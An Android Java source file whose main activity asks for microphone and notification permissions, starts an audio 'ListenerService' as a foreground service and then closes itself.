package com.example.listener;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

public class MainActivity extends Activity {
    private static final int REQ = 1;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        if (Build.VERSION.SDK_INT >= 23 &&
                checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.POST_NOTIFICATIONS}, REQ);
        } else start();
    }

    @Override public void onRequestPermissionsResult(int rc, String[] p, int[] r) {
        super.onRequestPermissionsResult(rc, p, r);
        start();
    }

    private void start() {
        try {
            Intent i = new Intent(this, ListenerService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
        } catch (Exception ignored) {}
        finish();
    }
}
